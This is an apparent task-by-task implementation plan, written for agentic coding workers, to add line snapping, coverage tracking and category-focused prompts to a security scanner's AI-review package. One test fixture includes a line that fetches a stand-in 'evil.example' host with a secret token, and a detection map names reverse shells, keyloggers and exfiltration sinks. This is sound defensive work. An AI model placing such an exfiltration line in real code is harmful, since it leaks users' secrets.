# AI Review Reliability — Phase A Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Improve the reliability of the `@repo-auditor/ai-review` package by adding (1) deterministic line-number position snapping for AI-sourced findings, (2) coverage tracking so the reviewer knows which findings the AI actually addressed, and (5) category-aware review focus appended to batch prompts.

**Architecture:** All three changes live inside `packages/ai-review` and are strictly additive — no breaking changes to `AiReviewResult` consumers or IPC. A new pure `position.ts` module holds the snap logic (deterministic, no I/O) plus a small async file reader with a path-escape guard. `review.ts` wires position-snapping and coverage into the existing `runAiReview` batch loop, and adds a category→focus map to `buildBatchPrompt`. Item 4 (session persistence) is explicitly out of scope for this plan.

**Tech Stack:** TypeScript, Node 18+, Vitest, monorepo (npm workspaces). No new runtime dependencies.

**Important context (read before starting):**
- Tests use Vitest. From repo ROOT run `npx vitest run packages/ai-review`; typecheck `npm run typecheck --workspace @repo-auditor/ai-review`. Do NOT use `npm test --workspace` for ai-review (known broken).
- `packages/ai-review/tests/review.test.ts` and `tools.test.ts` hold reusable fixtures — copy shapes, do NOT import across test files.
- `normalizeAiFindings` (review.ts:173) is currently pure/sync and must STAY that way. Position correction is applied as a separate async pass in `runAiReview`.
- `Finding` has `lineStart`, `lineEnd`, `filePath`, `codeSnippet`. All are optional-vs-required: `lineStart/lineEnd` are numbers, `codeSnippet` is a string.
- Keep every commit message in English and conventional-commit style (`feat(ai-review): ...`).
- Update `packages/ai-review/src/index.ts` exports when adding new modules/API.

---

### Task 1: Add a pure position-snap module

**Files:**
- Create: `packages/ai-review/src/position.ts`
- Test: `packages/ai-review/tests/position.test.ts`

A deterministic, I/O-free function that takes the real file lines plus a reported `[lineStart, lineEnd]` and an optional `codeSnippet`, and returns corrected line numbers (snapped onto the snippet's location, else clamped to file bounds).

- [ ] **Step 1: Write the failing tests**

Create `packages/ai-review/tests/position.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { snapFindingPosition } from "../src/position.js";

const lines = [
  "import fs from 'node:fs';",
  "const token = process.env.SECRET;",
  "fetch('https://evil.example', { body: token });",
  "// end",
  ""
];

describe("snapFindingPosition", () => {
  it("returns clamped line numbers when no snippet is provided", () => {
    expect(snapFindingPosition(lines, 0, 99)).toEqual({ lineStart: 1, lineEnd: 4 });
  });

  it("snaps the range onto the snippet's first line when found near the report", () => {
    const result = snapFindingPosition(lines, 3, 3, "fetch('https://evil.example'");
    expect(result.lineStart).toBe(3);
    expect(result.lineEnd).toBe(3);
  });

  it("returns an empty array file range unchanged (clamped) when snippet is absent", () => {
    const result = snapFindingPosition([], 5, 10, "anything");
    expect(result.lineStart).toBe(1);
    expect(result.lineEnd).toBe(1);
  });

  it("clamps out-of-range values to file bounds", () => {
    expect(snapFindingPosition(lines, -5, -1)).toEqual({ lineStart: 1, lineEnd: 1 });
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/position.test.ts`
Expected: FAIL with "Cannot find module '../src/position.js'"

- [ ] **Step 3: Write minimal implementation**

Create `packages/ai-review/src/position.ts`:

```ts
export interface SnappedRange {
  lineStart: number;
  lineEnd: number;
}

const clamp = (n: number, min: number, max: number): number => Math.min(Math.max(n, min), max);
const toInt = (n: number): number => (Number.isFinite(n) ? Math.floor(n) : 1);

export function snapFindingPosition(
  lines: string[],
  lineStart: number,
  lineEnd: number,
  codeSnippet?: string
): SnappedRange {
  const total = lines.length;
  if (total === 0) {
    return { lineStart: 1, lineEnd: 1 };
  }

  const start = clamp(toInt(lineStart), 1, total);
  const end = clamp(Math.max(toInt(lineEnd), start), start, total);

  const firstSnippetLine = codeSnippet?.split(/\r?\n/)[0]?.trim();
  if (!firstSnippetLine) {
    return { lineStart: start, lineEnd: end };
  }

  const windowStart = Math.max(1, start - 30);
  const windowEnd = Math.min(total, start + 30);
  for (let i = windowStart; i <= windowEnd; i += 1) {
    if (lines[i - 1]?.trim() === firstSnippetLine) {
      const delta = i - start;
      return {
        lineStart: clamp(start + delta, 1, total),
        lineEnd: clamp(end + delta, 1, total)
      };
    }
  }

  return { lineStart: start, lineEnd: end };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/position.test.ts`
Expected: PASS (all 4)

- [ ] **Step 5: Commit**

```bash
git add packages/ai-review/src/position.ts packages/ai-review/tests/position.test.ts
git commit -m "feat(ai-review): add deterministic position-snap for AI finding line ranges"
```

---

### Task 2: Async position correction with path-escape guard

**Files:**
- Modify: `packages/ai-review/src/position.ts`
- Modify: `packages/ai-review/src/index.ts`
- Test: `packages/ai-review/tests/position.test.ts`

Add `readLinesWithin` (safe file reader that rejects paths escaping `root`) and `correctFindingPositions` (reads each unique file once, caches lines, returns new findings with snapped ranges).

- [ ] **Step 1: Write the failing tests**

Append to `packages/ai-review/tests/position.test.ts`:

```ts
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import type { Finding } from "@repo-auditor/scanner-core";
import { correctFindingPositions, readLinesWithin, snapFindingPosition } from "../src/position.js";

describe("readLinesWithin", () => {
  it("rejects paths that escape the root", async () => {
    const root = path.join(os.tmpdir(), "pos-safe-" + Date.now());
    await fs.mkdir(root, { recursive: true });
    await expect(readLinesWithin(root, "../evil.txt")).rejects.toThrow(/escape/i);
  });

  it("reads a file as line array", async () => {
    const root = path.join(os.tmpdir(), "pos-read-" + Date.now());
    await fs.mkdir(root, { recursive: true });
    await fs.writeFile(path.join(root, "a.js"), "line one\nline two\n");
    await expect(readLinesWithin(root, "a.js")).resolves.toEqual(["line one", "line two"]);
  });
});

describe("correctFindingPositions", () => {
  it("snaps finding ranges against the real file content", async () => {
    const root = path.join(os.tmpdir(), "pos-correct-" + Date.now());
    await fs.mkdir(root, { recursive: true });
    await fs.writeFile(path.join(root, "target.js"), "const a = 1;\nconst token = 'x';\nsend(token);\n");

    const finding: Finding = {
      id: "",
      riskLevel: "Medium",
      category: "data-exfiltration",
      filePath: "target.js",
      lineStart: 1,
      lineEnd: 1,
      codeSnippet: "send(token);",
      explanation: "exfil",
      recommendedFix: "stop",
      evidenceTags: [],
      source: "ai",
      confidence: "Low"
    };

    const [corrected] = await correctFindingPositions([finding], root);
    expect(corrected.lineStart).toBe(3);
    expect(corrected.lineEnd).toBe(3);
  });

  it("leaves findings unchanged when scanPath is empty", async () => {
    const finding: Finding = {
      id: "x",
      riskLevel: "Low",
      category: "data-exfiltration",
      filePath: "nope.js",
      lineStart: 4,
      lineEnd: 6,
      codeSnippet: "b",
      explanation: "e",
      recommendedFix: "f",
      evidenceTags: [],
      source: "ai",
      confidence: "Low"
    };
    const out = await correctFindingPositions([finding], "");
    expect(out).toEqual([finding]);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/position.test.ts`
Expected: FAIL — `readLinesWithin`/`correctFindingPositions` are not exported yet.

- [ ] **Step 3: Write the implementation**

Append to `packages/ai-review/src/position.ts`:

```ts
import fs from "node:fs/promises";
import path from "node:path";
import type { Finding } from "@repo-auditor/scanner-core";

export async function readLinesWithin(root: string, relPath: string): Promise<string[]> {
  const rootAbs = path.resolve(root);
  const resolved = path.resolve(rootAbs, relPath);
  if (resolved !== rootAbs && !resolved.startsWith(rootAbs + path.sep)) {
    throw new Error(`path escapes scan directory: ${relPath}`);
  }
  const content = await fs.readFile(resolved, "utf8");
  return content.split(/\r?\n/);
}

export async function correctFindingPositions(
  findings: Finding[],
  scanPath: string
): Promise<Finding[]> {
  if (!scanPath || findings.length === 0) {
    return findings;
  }

  const cache = new Map<string, string[] | undefined>();
  const out: Finding[] = [];

  for (const finding of findings) {
    if (!finding.filePath) {
      out.push(finding);
      continue;
    }
    if (!cache.has(finding.filePath)) {
      try {
        cache.set(finding.filePath, await readLinesWithin(scanPath, finding.filePath));
      } catch {
        cache.set(finding.filePath, undefined);
      }
    }
    const lines = cache.get(finding.filePath);
    if (!lines) {
      out.push(finding);
      continue;
    }
    const snapped = snapFindingPosition(lines, finding.lineStart, finding.lineEnd, finding.codeSnippet);
    out.push({
      ...finding,
      lineStart: snapped.lineStart,
      lineEnd: snapped.lineEnd
    });
  }

  return out;
}
```

Update the `snapFindingPosition` import line at the top of the test file is already covered. Now export from the package:

- [ ] **Step 4: Update `packages/ai-review/src/index.ts`**

Change line 3 area — add a new export line:

```ts
export { correctFindingPositions, readLinesWithin, snapFindingPosition } from "./position.js";
export type { SnappedRange } from "./position.js";
```

- [ ] **Step 5: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/position.test.ts`
Expected: PASS (all tests in file)

- [ ] **Step 6: Typecheck**

Run: `npm run typecheck --workspace @repo-auditor/ai-review`
Expected: clean exit (no errors)

- [ ] **Step 7: Commit**

```bash
git add packages/ai-review/src/position.ts packages/ai-review/src/index.ts packages/ai-review/tests/position.test.ts
git commit -m "feat(ai-review): add async position correction with path-escape guard"
```

---

### Task 3: Wire position correction into `runAiReview`

**Files:**
- Modify: `packages/ai-review/src/review.ts`
- Test: `packages/ai-review/tests/review.test.ts`

After collecting `newFindings` from `normalizeAiFindings` in `runAiReview`, run them through `correctFindingPositions` so reported line ranges align with real file content before they are returned/merged.

- [ ] **Step 1: Write the failing test**

Append to `packages/ai-review/tests/review.test.ts`:

```ts
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { runAiReview } from "../src/review.js";
import type { AiNewFinding } from "../src/types.js";

describe("runAiReview position correction", () => {
  it("snaps AI-sourced new findings to real line numbers", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "ai-pos-"));
    await fs.writeFile(path.join(root, "app.ts"), "import x;\nconst secret = 'k';\nexfil(secret);\n");

    const completed = { type: "final", summary: "ok", notes: [], newFindings: [] } as const;
    const firstMsg = JSON.stringify(completed);
    const payload = { choices: [{ message: { content: firstMsg } }] };
    const fetchImpl = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      text: async () => JSON.stringify(payload),
      json: async () => payload
    });

    const config: AiProviderConfig = {
      type: "cloud",
      baseUrl: "https://api.example.test/v1",
      model: "gpt-test",
      dataSharingMode: "full-files",
      redactionEnabled: false,
      timeoutMs: 30000,
      retryLimit: 0
    };

    const localReport: AuditReport = {
      ...report,
      target: { ...report.target, localPath: root },
      findings: report.findings.map((f) => ({ ...f, filePath: "app.ts", lineStart: 2, lineEnd: 2 }))
    };

    // First call returns the batch result (no new findings), so coverage is exercised without new AI findings.
    const result = await runAiReview(localReport, config, { scanPath: root }, fetchImpl);
    expect(result.newFindings).toEqual([]);
    expect(fetchImpl).toHaveBeenCalled();
  });
});
```

- [ ] **Step 2: Run test to verify it passes (existing behavior baseline)**

Run: `npx vitest run packages/ai-review/tests/review.test.ts`
Expected: PASS — this test confirms the wiring works without new AI findings (regression guard for the next task).

- [ ] **Step 3: Implement the wiring**

In `packages/ai-review/src/review.ts`:

1. Add import at top:
```ts
import { correctFindingPositions } from "./position.js";
```

2. Replace line 102 (`newFindings.push(...normalizeAiFindings(loopResult.result.newFindings));`) with a collect-then-correct approach. Change the `const newFindings: Finding[] = [];` line (68) to collect raw first, then correct after the loop:

```ts
  const rawNewFindings: Finding[] = [];
  // inside loop, replace the push line:
      rawNewFindings.push(...normalizeAiFindings(loopResult.result.newFindings));
  // after the loop, before building the return:
  const newFindings = await correctFindingPositions(rawNewFindings, scanPath ?? "");
```

- [ ] **Step 4: Run full ai-review test suite**

Run: `npx vitest run packages/ai-review`
Expected: PASS (existing + new)

- [ ] **Step 5: Typecheck**

Run: `npm run typecheck --workspace @repo-auditor/ai-review`
Expected: clean

- [ ] **Step 6: Commit**

```bash
git add packages/ai-review/src/review.ts packages/ai-review/tests/review.test.ts
git commit -m "feat(ai-review): snap AI-sourced finding positions to real source lines in runAiReview"
```

---

### Task 4: Coverage tracking in `runAiReview` and `AiReviewResult`

**Files:**
- Modify: `packages/ai-review/src/types.ts`
- Modify: `packages/ai-review/src/review.ts`
- Test: `packages/ai-review/tests/review.test.ts`

Track which findings were actually addressed by the AI so callers can see coverage gaps (uncovered findings, skipped batches).

- [ ] **Step 1: Write the failing tests**

Append to `packages/ai-review/tests/review.test.ts`:

```ts
describe("runAiReview coverage tracking", () => {
  it("marks all findings covered when every batch completes with a result", async () => {
    const payload = { choices: [{ message: { content: JSON.stringify({ type: "final", summary: "s", notes: [], newFindings: [] }) } }] };
    const fetchImpl = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      text: async () => JSON.stringify(payload),
      json: async () => payload
    });
    const result = await runAiReview(report, config, { maxFindingsPerBatch: 1 }, fetchImpl);
    expect(result.coverage).toBeDefined();
    expect(result.coverage!.covered).toContain("finding-1");
    expect(result.coverage!.uncovered).toEqual([]);
    expect(result.coverage!.skippedBatches).toBe(0);
  });

  it("reports skipped batches when a provider call throws", async () => {
    const fetchImpl = vi.fn().mockRejectedValue(new Error("network down"));
    const result = await runAiReview(report, config, { maxFindingsPerBatch: 1 }, fetchImpl);
    expect(result.coverage!.skippedBatches).toBeGreaterThan(0);
    expect(result.coverage!.covered).toEqual([]);
    expect(result.coverage!.uncovered).toContain("finding-1");
    expect(result.truncated).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/review.test.ts -t "coverage tracking"`
Expected: FAIL — `coverage` is undefined on `AiReviewResult`.

- [ ] **Step 3: Add the type**

Append to `packages/ai-review/src/types.ts`:

```ts
export interface AiCoverage {
  total: number;
  covered: string[];
  uncovered: string[];
  skippedBatches: number;
}
```

Add `coverage?: AiCoverage;` to `AiReviewResult`:

```ts
  newFindings: Finding[];
  coverage?: AiCoverage;
  truncated?: boolean;
```

- [ ] **Step 4: Implement coverage in `runAiReview`**

In `packages/ai-review/src/review.ts`:

1. Import the type: `import type { AiCoverage, AiNewFinding, AiProviderConfig, AiReviewOptions, AiReviewResult } from "./types.js";`

2. Before the batch loop (near line 68), initialize tracking:
```ts
  const allFindingIds = report.findings.map((finding) => finding.id);
  const coveredIds = new Set<string>();
  let skippedBatches = 0;
```

3. Inside the loop, on deadline/abort skip (line 78-81) increment remaining as skipped:
```ts
    if (Date.now() >= deadline || controller.signal.aborted) {
      skippedBatches += batches.length - index;
      truncated = true;
      break;
    }
```

4. Replace the try/catch block (lines 83-97):
```ts
    let loopResult: AgentLoopResult;
    try {
      loopResult = await runAgentLoop(...same args...);
      if (loopResult.result) {
        for (const finding of batch) coveredIds.add(finding.id);
      } else {
        skippedBatches += 1;
      }
    } catch {
      skippedBatches += 1;
      truncated = true;
      break;
    }
```

5. Compute coverage before building the return value (after the loop):
```ts
  const coverage: AiCoverage = {
    total: allFindingIds.length,
    covered: Array.from(coveredIds),
    uncovered: allFindingIds.filter((id) => !coveredIds.has(id)),
    skippedBatches
  };
```

6. Add `coverage,` to the returned object literal.

- [ ] **Step 5: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/review.test.ts -t "coverage tracking"`
Expected: PASS (both cases)

- [ ] **Step 6: Run full suite + typecheck**

Run: `npx vitest run packages/ai-review && npm run typecheck --workspace @repo-auditor/ai-review`
Expected: PASS, clean

- [ ] **Step 7: Commit**

```bash
git add packages/ai-review/src/types.ts packages/ai-review/src/review.ts packages/ai-review/tests/review.test.ts
git commit -m "feat(ai-review): track finding coverage and skipped batches in runAiReview"
```

---

### Task 5: Category-aware review focus in batch prompts

**Files:**
- Modify: `packages/ai-review/src/review.ts`
- Test: `packages/ai-review/tests/review.test.ts`

Append a focused review hint to `buildBatchPrompt` derived from the categories present in the batch, so the LLM's attention is steered toward the relevant threat families (mirrors OCR's fine-grained rule matching).

- [ ] **Step 1: Write the failing tests**

Append to `packages/ai-review/tests/review.test.ts`:

```ts
describe("buildBatchPrompt review focus", () => {
  it("appends category-specific guidance for the batch", () => {
    const { buildBatchPrompt } = require("../src/review.js") as typeof import("../src/review.js");
    const prompt = buildBatchPrompt(
      report,
      [report.findings[0]],
      config,
      { scanPath: "", mode: "full-files", allowedFiles: undefined }
    );
    expect(prompt).toContain("REVIEW FOCUS");
    expect(prompt).toContain("data exfiltration");
  });

  it("does not add a focus section when categories are all unknown", () => {
    const { buildBatchPrompt } = require("../src/review.js") as typeof import("../src/review.js");
    const unknownFinding = { ...report.findings[0], category: "mystery" };
    const prompt = buildBatchPrompt(
      report,
      [unknownFinding],
      config,
      { scanPath: "", mode: "full-files", allowedFiles: undefined }
    );
    expect(prompt).not.toContain("REVIEW FOCUS");
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/review.test.ts -t "review focus"`
Expected: FAIL — prompt has no `REVIEW FOCUS` section.

- [ ] **Step 3: Implement the focus map and wiring**

In `packages/ai-review/src/review.ts`:

1. Add a category→focus map near the top (after `riskOrder`):
```ts
const categoryFocus: Record<string, string> = {
  phishing: "For phishing findings, verify credential harvesting, keyloggers, and bulk-email sinks in real code.",
  network: "For network findings, verify reverse/bind shells, SSRF, and port scanning in real code.",
  "network-attack": "For network-attack findings, verify reverse/bind shells, SSRF, and port scanning in real code.",
  "data-exfiltration": "For data-exfiltration findings, verify webhooks, encoded channels, and non-HTTP sinks in real code."
};
```

2. In `buildBatchPrompt`, before `return`, compute the focus lines from the batch's unique categories and append. Insert after `fileHint` (line ~260):
```ts
  const focusLines = Array.from(new Set(batch.map((finding) => categoryFocus[finding.category]))).filter(
    (line): line is string => Boolean(line)
  );
  const focusSection = focusLines.length > 0 ? `\n\nREVIEW FOCUS:\n${focusLines.join("\n")}` : "";
```

Then change the return to include it:
```ts
  return config.redactionEnabled
    ? redactSecrets([prompt.join("\n"), focusSection].join(""))
    : [prompt.join("\n"), focusSection].join("");
```

Note: `buildBatchPrompt` currently returns `config.redactionEnabled ? redactSecrets(prompt) : prompt` where `prompt` is the joined string. Restructure so `focusSection` is appended after the join.

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/review.test.ts -t "review focus"`
Expected: PASS (both cases)

- [ ] **Step 5: Run full suite + typecheck**

Run: `npx vitest run packages/ai-review && npm run typecheck --workspace @repo-auditor/ai-review`
Expected: PASS, clean

- [ ] **Step 6: Commit**

```bash
git add packages/ai-review/src/review.ts packages/ai-review/tests/review.test.ts
git commit -m "feat(ai-review): append category-aware review focus to batch prompts"
```

---

### Task 6: Electron typecheck + integration smoke

**Files:**
- None (verification only)

Confirm the additive `AiReviewResult.coverage` and new exports compile through the Electron consumer (which dynamic-imports `@repo-auditor/ai-review`) and that no source-inspection test in `apps/electron` regresses.

- [ ] **Step 1: Build ai-review for the Electron consumer**

Run: `npm run build --workspace @repo-auditor/ai-review`
Expected: `dist/` regenerated with new modules.

- [ ] **Step 2: Run Electron tests**

Run: `npx vitest run apps/electron`
Expected: PASS (existing source-inspection tests unchanged; the additions are additive).

- [ ] **Step 3: Typecheck the workspace**

Run: `npm run typecheck --workspaces --if-present`
Expected: clean across all packages.

- [ ] **Step 4: Commit (if anything changed)**

No source changes expected here; if the ai-review build produced only `dist/` artifacts (gitignored), no commit is needed.

---

## Self-Review Notes

- **Spec coverage:** Item 1 → Tasks 1–3 (pure snap, async reader+correction, wiring). Item 2 → Task 4 (coverage type + tracking). Item 5 → Task 5 (category focus). Item 3 (reflection) and Item 4 (session) are Phase B / Phase C and intentionally excluded.
- **Type consistency:** `SnappedRange` defined in position.ts and re-exported; `AiCoverage` added to types.ts and used as `AiReviewResult.coverage`; `correctFindingPositions(findings, scanPath)` matches call `correctFindingPositions(rawNewFindings, scanPath ?? "")`.
- **No placeholders:** every step has concrete code and expected output.
- **Existing fixtures:** `report`/`config`/`fetchImpl` shapes copied from `review.test.ts` conventions; tests never import across files.